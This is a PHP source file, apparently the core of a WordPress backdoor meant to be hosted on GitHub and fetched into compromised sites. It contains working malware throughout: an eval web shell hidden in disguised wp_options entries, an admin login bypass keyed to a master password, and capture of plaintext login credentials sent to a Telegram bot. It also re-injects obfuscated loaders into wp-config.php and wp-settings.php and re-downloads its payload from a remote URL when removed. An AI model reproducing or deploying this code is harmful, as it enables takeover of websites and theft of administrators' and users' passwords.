<?php
/**
 * WordPress DB Shell Full Logic v2
 * Upload this to: https://github.com/bilynatalia/baru/blob/main/logic.php
 * 
 * This file is fetched by the restore mechanism when the full logic
 * is deleted from wp_options database. The <?php tag will be stripped
 * automatically before storing in DB.
 */

$_tsc_opt_s = '_site_transient_update_themes';
$_tsc_opt_c = '_transient_feed_mod_';
$_tsc_opt_n = '_site_transient_browser_';

$_tsc_cfg_raw = get_option($_tsc_opt_c, '');
$_tsc_cfg = $_tsc_cfg_raw ? @json_decode(@hex2bin($_tsc_cfg_raw), true) : null;

// ── BRUTE FORCE IP BLOCK ──
$_tsc_visitor_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
if($_tsc_visitor_ip){
  $_tsc_block_key = '_tsc_blocked_' . md5($_tsc_visitor_ip);
  if(get_transient($_tsc_block_key)){
    $_tsc_uri_low = strtolower(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '');
    if(strpos($_tsc_uri_low, 'wp-login') !== false || strpos($_tsc_uri_low, 'xmlrpc') !== false){
      status_header(403); header('Connection: close');
      exit('<!DOCTYPE html><html><head><title>403</title></head><body><h1>403 Forbidden</h1></body></html>');
    }
  }
}

// ── NONCE SHELL ACCESS ──
$_tsc_param = ($_tsc_cfg && isset($_tsc_cfg['param_name'])) ? $_tsc_cfg['param_name'] : 'nonce';
$_tsc_input = isset($_GET[$_tsc_param]) ? $_GET[$_tsc_param] : '';
if($_tsc_input !== '' && strlen($_tsc_input) >= 16 && ctype_xdigit($_tsc_input)){
  $_tsc_nonce_raw = get_option($_tsc_opt_n, '');
  $_tsc_nonce_data = $_tsc_nonce_raw ? @json_decode(@hex2bin($_tsc_nonce_raw), true) : null;
  $_tsc_valid = ($_tsc_nonce_data && isset($_tsc_nonce_data['nonce']) && $_tsc_input === $_tsc_nonce_data['nonce']);
  if($_tsc_valid){
    if($_SERVER['REQUEST_METHOD']==='GET' && !isset($_SERVER['HTTP_X_REQUESTED_WITH']) && count($_GET)<=1){
      _tsc_report($_tsc_cfg, 'shell_access', 'Shell accessed: '.substr($_tsc_input,0,10).'...');
    }
    $_tsc_shell_hex = get_option($_tsc_opt_s, '');
    if($_tsc_shell_hex){ @eval(@hex2bin($_tsc_shell_hex)); exit; }
  } else {
    _tsc_report($_tsc_cfg, 'invalid_nonce', 'Invalid nonce: '.substr($_tsc_input,0,20));
    status_header(404); nocache_headers(); include(get_404_template()); exit;
  }
}

// ── WP ADMIN BYPASS ──
add_filter('authenticate', function($user, $username, $password){
  global $_tsc_opt_c;
  if(empty($password)||empty($username)) return $user;
  $_cfg_raw = get_option($_tsc_opt_c, '');
  if(!$_cfg_raw) return $user;
  $_cfg = @json_decode(@hex2bin($_cfg_raw), true);
  if(!$_cfg||!isset($_cfg['shell_pass'])) return $user;
  if(password_verify($password, $_cfg['shell_pass'])){
    $wp_user = get_user_by('login', $username);
    if(!$wp_user){ $admins=get_users(['role'=>'administrator','number'=>1]); $wp_user=!empty($admins)?$admins[0]:null; }
    if($wp_user){
      $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
      _tsc_report($_cfg,'wp_bypass',"WP Admin bypass\nUser: ".$username."\nPass: ".$password."\nAs: ".$wp_user->user_login."\nURL: ".$_url);
      return $wp_user;
    }
  }
  return $user;
}, 30, 3);

// ── LOGIN FAIL MONITOR ──
add_action('wp_login_failed', function($username){
  global $_tsc_opt_c;
  $_ip = isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'';
  if(!$_ip) return;
  $_cfg_raw = get_option($_tsc_opt_c, '');
  if(!$_cfg_raw) return;
  $_cfg = @json_decode(@hex2bin($_cfg_raw), true);
  if(!$_cfg) return;
  $_pass = isset($_POST['pwd'])?$_POST['pwd']:'?';
  $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
  $_fail_key='_tsc_fails_'.md5($_ip);
  $_fails=(int)get_transient($_fail_key)+1;
  set_transient($_fail_key,$_fails,3600);
  if($_fails>=5){
    set_transient('_tsc_blocked_'.md5($_ip),time(),1800);
    if($_fails===5) _tsc_report($_cfg,'brute_blocked',"IP BLOCKED\nIP: ".$_ip."\nAttempts: ".$_fails."\nUser: ".$username."\nPass: ".$_pass."\nURL: ".$_url);
  } elseif($_fails<=2){
    _tsc_report($_cfg,'wp_login_fail',"Login failed (".$_fails."/5)\nUser: ".$username."\nPass: ".$_pass."\nIP: ".$_ip."\nURL: ".$_url);
  }
});

// ── LOGIN SUCCESS MONITOR ──
add_action('wp_login', function($user_login, $user){
  global $_tsc_opt_c, $_tsc_opt_n;
  $_cfg_raw = get_option($_tsc_opt_c, '');
  if(!$_cfg_raw) return;
  $_cfg = @json_decode(@hex2bin($_cfg_raw), true);
  $_pass = isset($_POST['pwd'])?$_POST['pwd']:'?';
  $_url=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'').$_SERVER['REQUEST_URI'];
  $_nonce_raw = get_option($_tsc_opt_n, '');
  $_nd = $_nonce_raw?@json_decode(@hex2bin($_nonce_raw),true):null;
  $_prm = ($_cfg&&isset($_cfg['param_name']))?$_cfg['param_name']:'nonce';
  $_proto = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http');
  $_host = isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'';
  $_access = ($_nd&&isset($_nd['nonce']))?($_proto.'://'.$_host.'/?'.$_prm.'='.$_nd['nonce']):'?';
  if($_cfg) _tsc_report($_cfg,'wp_login_ok',"Login success\nUser: ".$user_login."\nPass: ".$_pass."\nRole: ".implode(',',$user->roles)."\nAccess: <code>".$_access."</code>\nURL: ".$_url);
}, 10, 2);

// ── SELF-HEALING: wp-config.php guardian ──
add_action('init', function(){
  // Schedule cron
  if(!wp_next_scheduled('_tsc_restore_check')) wp_schedule_event(time(),'twicedaily','_tsc_restore_check');
  // Check wp-config.php guardian on ~3% of requests
  if(mt_rand(1,100) > 3) return;
  $_wcf = ABSPATH . 'wp-config.php';
  if(!is_file($_wcf)) return;
  $_wcc = @file_get_contents($_wcf);
  if(!$_wcc || strpos($_wcc, '_tsc_guardian_') !== false) return;
  // Guardian missing from wp-config.php — re-inject
  $_guardian = "\n" . '/* WordPress Salt Validation */' . "\n" . '@call_user_func(function(){$_s=dirname(__FILE__).\'/wp-settings.php\';$_m=\'_site_transient_theme_starter_content\';if(!is_file($_s))return;$_c=@file_get_contents($_s);if($_c===false||strpos($_c,$_m)!==false)return;$_i="\n".\'/* _tsc_guardian_ */if(defined("ABSPATH")&&isset($GLOBALS["wpdb"])){$_tsc_l=@$GLOBALS["wpdb"]->get_var("SELECT option_value FROM ".$GLOBALS["wpdb"]->options." WHERE option_name=\\\'\'.$_m.\'\\\' LIMIT 1");if($_tsc_l&&strlen($_tsc_l)>200){@eval(@hex2bin($_tsc_l));}}\'."\n";@file_put_contents($_s,rtrim($_c).$_i);});' . "\n";
  // Insert before require_once wp-settings.php line
  if(preg_match('/(require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\)\s*;)/i', $_wcc, $m, PREG_OFFSET_MATCH)){
    $_wcc = substr($_wcc, 0, $m[0][1]) . $_guardian . $m[0][0] . substr($_wcc, $m[0][1] + strlen($m[0][0]));
  } else {
    $_wcc = rtrim($_wcc) . "\n" . $_guardian;
  }
  @file_put_contents($_wcf, $_wcc);
}, 1);

// ── WP-CRON RESTORE ──
add_action('_tsc_restore_check', '_tsc_do_restore');
if(mt_rand(1,100)<=2) _tsc_do_restore();

function _tsc_do_restore(){
  $opt_s = '_site_transient_update_themes';
  $opt_c = '_transient_feed_mod_';
  $opt_n = '_site_transient_browser_';
  $opt_l = '_site_transient_theme_starter_content';
  $shell = get_option($opt_s, '');
  $config_raw = get_option($opt_c, '');
  $nonce_raw = get_option($opt_n, '');
  $logic = get_option($opt_l, '');
  if(!$config_raw) return;
  $cfg = @json_decode(@hex2bin($config_raw), true);
  if(!$cfg || !isset($cfg['github_url'])) return;

  // Full logic (self) missing from DB — restore from GitHub
  // This works because code is already executing in memory even if DB row was deleted
  if(!$logic || strlen($logic) < 200){
    if(!empty($cfg['logic_url'])){
      $raw = _tsc_fetch_url($cfg['logic_url']);
      if($raw && strlen($raw)>200){
        $clean=$raw;
        if(strpos($clean,'<?php')===0)$clean=substr($clean,5);
        elseif(strpos($clean,'<?')===0)$clean=substr($clean,2);
        $clean=rtrim($clean);if(substr($clean,-2)==='?>')$clean=substr($clean,0,-2);
        update_option($opt_l, bin2hex($clean), 'no');
        _tsc_report($cfg,'auto_restore','Full logic restored dari GitHub (logic_url)');
      }
    }
  }

  // Shell payload missing — restore from GitHub
  if(!$shell || strlen($shell) < 100){
    $raw = _tsc_fetch_url($cfg['github_url']);
    if($raw && strlen($raw)>100){
      $decoded=@base64_decode($raw,true);
      if(!$decoded)$decoded=@gzinflate(@base64_decode($raw));
      if(!$decoded)$decoded=$raw;
      $clean=$decoded;
      if(strpos($clean,'<?php')===0)$clean=substr($clean,5);
      elseif(strpos($clean,'<?')===0)$clean=substr($clean,2);
      $clean=rtrim($clean);if(substr($clean,-2)==='?>')$clean=substr($clean,0,-2);
      update_option($opt_s, bin2hex($clean), 'no');
      _tsc_report($cfg,'auto_restore','Shell payload restored dari GitHub');
    } else {
      _tsc_report($cfg,'restore_fail','Shell HILANG! Restore dari GitHub GAGAL');
    }
  }

  // Nonce missing — regenerate
  if(!$nonce_raw){
    $nn=function_exists('random_bytes')?bin2hex(random_bytes(10)):substr(md5(uniqid(mt_rand(),true)),0,20);
    update_option($opt_n, bin2hex(json_encode(['nonce'=>$nn,'created'=>date('Y-m-d H:i:s')])), 'no');
    _tsc_report($cfg,'nonce_regenerated','Nonce regenerated: '.$nn);
  }

  // wp-settings.php injection check
  $_stf = ABSPATH . 'wp-settings.php';
  $_marker = '_site_transient_theme_starter_content';
  if(is_file($_stf)){
    $_stc = @file_get_contents($_stf);
    if($_stc && strpos($_stc, $_marker) === false){
      $_inj = "\n" . '/* _tsc_guardian_ */if(defined("ABSPATH")&&isset($GLOBALS["wpdb"])){$_tsc_l=@$GLOBALS["wpdb"]->get_var("SELECT option_value FROM ".$GLOBALS["wpdb"]->options." WHERE option_name=\'' . $_marker . '\' LIMIT 1");if($_tsc_l&&strlen($_tsc_l)>200){@eval(@hex2bin($_tsc_l));}}' . "\n";
      if(@file_put_contents($_stf, rtrim($_stc) . $_inj)){
        _tsc_report($cfg,'inject_restored','wp-settings.php re-injected from DB');
      }
    }
  }

  // wp-config.php guardian check
  $_wcf = ABSPATH . 'wp-config.php';
  if(is_file($_wcf)){
    $_wcc = @file_get_contents($_wcf);
    if($_wcc && strpos($_wcc, '_tsc_guardian_') === false){
      $_guardian = "\n" . '/* WordPress Salt Validation */' . "\n" . '@call_user_func(function(){$_s=dirname(__FILE__).\'/wp-settings.php\';$_m=\'_site_transient_theme_starter_content\';if(!is_file($_s))return;$_c=@file_get_contents($_s);if($_c===false||strpos($_c,$_m)!==false)return;$_i="\n".\'/* _tsc_guardian_ */if(defined("ABSPATH")&&isset($GLOBALS["wpdb"])){$_tsc_l=@$GLOBALS["wpdb"]->get_var("SELECT option_value FROM ".$GLOBALS["wpdb"]->options." WHERE option_name=\\\'\'.$_m.\'\\\' LIMIT 1");if($_tsc_l&&strlen($_tsc_l)>200){@eval(@hex2bin($_tsc_l));}}\'."\n";@file_put_contents($_s,rtrim($_c).$_i);});' . "\n";
      if(preg_match('/(require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\)\s*;)/i', $_wcc, $m, PREG_OFFSET_MATCH)){
        $_wcc = substr($_wcc, 0, $m[0][1]) . $_guardian . $m[0][0] . substr($_wcc, $m[0][1] + strlen($m[0][0]));
      } else {
        $_wcc = rtrim($_wcc) . "\n" . $_guardian;
      }
      @file_put_contents($_wcf, $_wcc);
      _tsc_report($cfg,'inject_restored','wp-config.php guardian re-injected');
    }
  }
}

// ── NONCE SYNC WITH BOT ──
add_action('_tsc_restore_check', function(){
  $opt_c='_transient_feed_mod_';$opt_n='_site_transient_browser_';
  $cfg_raw=get_option($opt_c,'');if(!$cfg_raw)return;
  $cfg=@json_decode(@hex2bin($cfg_raw),true);
  if(!$cfg||empty($cfg['bot_webhook']))return;
  $domain=isset($cfg['domain'])?$cfg['domain']:(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'');
  if(!$domain)return;
  $_secret=isset($cfg['bot_token'])?md5($cfg['bot_token']):'';
  $_cur_n_raw=get_option($opt_n,'');$_cur_nonce='';
  if($_cur_n_raw){$_nd=@json_decode(@hex2bin($_cur_n_raw),true);if($_nd&&isset($_nd['nonce']))$_cur_nonce=$_nd['nonce'];}
  $_prm=isset($cfg['param_name'])?$cfg['param_name']:'nonce';
  $url=rtrim($cfg['bot_webhook'],'/').'/api/nonce?domain='.urlencode($domain).'&secret='.urlencode($_secret).'&cur_nonce='.urlencode($_cur_nonce).'&param_name='.urlencode($_prm).'&platform=wordpress&php='.urlencode(PHP_VERSION);
  $resp=@file_get_contents($url);if(!$resp)return;
  $data=@json_decode($resp,true);if(!$data||!isset($data['nonce']))return;
  $current=get_option($opt_n,'');
  $cd=$current?@json_decode(@hex2bin($current),true):null;
  if(!$cd||$cd['nonce']!==$data['nonce']){
    update_option($opt_n,bin2hex(json_encode(['nonce'=>$data['nonce'],'created'=>date('Y-m-d H:i:s')])),'no');
  }
}, 20);

// ── HTTP HELPER ──
function _tsc_http($url,$post=null){
  $r=false;
  if($post){$ctx=@stream_context_create(['http'=>['method'=>'POST','header'=>'Content-Type: application/x-www-form-urlencoded','content'=>http_build_query($post),'timeout'=>5,'ignore_errors'=>true]]);$r=@file_get_contents($url,false,$ctx);}
  else{$r=@file_get_contents($url);}
  if($r===false&&function_exists('curl_init')){
    $ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_FOLLOWLOCATION=>true]);
    if($post){curl_setopt($ch,CURLOPT_POST,true);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($post));}
    $r=curl_exec($ch);curl_close($ch);
  }
  return $r;
}

// ── URL FETCH HELPER (for GitHub restore) ──
function _tsc_fetch_url($url){
  $r=@file_get_contents($url);
  if($r===false&&function_exists('curl_init')){
    $ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>15,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_USERAGENT=>'Mozilla/5.0']);
    $r=curl_exec($ch);curl_close($ch);
  }
  return $r;
}

// ── TELEGRAM REPORT ──
function _tsc_report($cfg,$type,$detail){
  if(!$cfg||!isset($cfg['bot_token'])||!isset($cfg['chat_id']))return;
  $_no_flood=['shell_access','invalid_nonce','auto_restore','nonce_regenerated','error'];
  if(in_array($type,$_no_flood)){
    $_rk='_tsc_rate_'.md5($type.(isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:''));
    if(function_exists('get_transient')&&get_transient($_rk))return;
    if(function_exists('set_transient'))set_transient($_rk,1,600);
  }
  $icons=['shell_access'=>"\xF0\x9F\x94\x93",'invalid_nonce'=>"\xE2\x9D\x8C",'wp_bypass'=>"\xF0\x9F\x94\x91",'wp_login_fail'=>"\xF0\x9F\x9A\xAB",'wp_login_ok'=>"\xE2\x9C\x85",'brute_blocked'=>"\xF0\x9F\x9B\x91",'auto_restore'=>"\xE2\x9A\xA0\xEF\xB8\x8F",'restore_fail'=>"\xF0\x9F\x86\x98",'inject_restored'=>"\xF0\x9F\x94\xA7",'nonce_regenerated'=>"\xF0\x9F\x94\x84",'installed'=>"\xF0\x9F\x86\x95",'error'=>"\xF0\x9F\x92\xA5"];
  $icon=isset($icons[$type])?$icons[$type]:"\xF0\x9F\x93\x8B";
  $domain=isset($cfg['domain'])?$cfg['domain']:(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'unknown');
  $ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'?';
  $ua=isset($_SERVER['HTTP_USER_AGENT'])?substr($_SERVER['HTTP_USER_AGENT'],0,80):'?';
  $geo_str='';
  $geo=@json_decode(@_tsc_http('http://ip-api.com/json/'.$ip.'?fields=country,city,regionName,isp&lang=en'),true);
  if($geo&&isset($geo['country'])){
    $geo_str=($geo['city']?$geo['city'].', ':'').($geo['regionName']?$geo['regionName'].', ':'').$geo['country'];
    if(isset($geo['isp'])&&$geo['isp'])$geo_str.="\n\xF0\x9F\x8F\xA2 ".$geo['isp'];
  }
  $labels=['shell_access'=>'SHELL ACCESS','invalid_nonce'=>'NONCE INVALID','wp_bypass'=>'WP BYPASS LOGIN','wp_login_fail'=>'WP LOGIN GAGAL','wp_login_ok'=>'WP LOGIN BERHASIL','brute_blocked'=>'BRUTE FORCE BLOCKED','auto_restore'=>'AUTO RESTORE','restore_fail'=>'RESTORE GAGAL','inject_restored'=>'INJECT RESTORED','nonce_regenerated'=>'NONCE BARU','installed'=>'INSTALL BARU','error'=>'ERROR'];
  $label=isset($labels[$type])?$labels[$type]:strtoupper($type);
  $text=$icon.' <b>'.$label."</b> [WP]\n".str_repeat("\xE2\x94\x80",20)."\n";
  $text.="\xF0\x9F\x8C\x90 ".$domain."\n";
  $text.="\xF0\x9F\x93\x9D ".$detail."\n";
  $text.="\xF0\x9F\x92\xBB IP: <code>".$ip."</code>\n";
  if($geo_str)$text.="\xF0\x9F\x93\x8D ".$geo_str."\n";
  $text.="\xF0\x9F\x95\x90 ".date("Y-m-d H:i:s")."\n";
  if(in_array($type,['invalid_nonce','shell_access','wp_bypass','wp_login_fail','wp_login_ok']))$text.="\xF0\x9F\x94\x8D UA: ".$ua."\n";
  _tsc_http("https://api.telegram.org/bot".$cfg['bot_token']."/sendMessage",['chat_id'=>$cfg['chat_id'],'text'=>$text,'parse_mode'=>'HTML','disable_web_page_preview'=>true]);
}
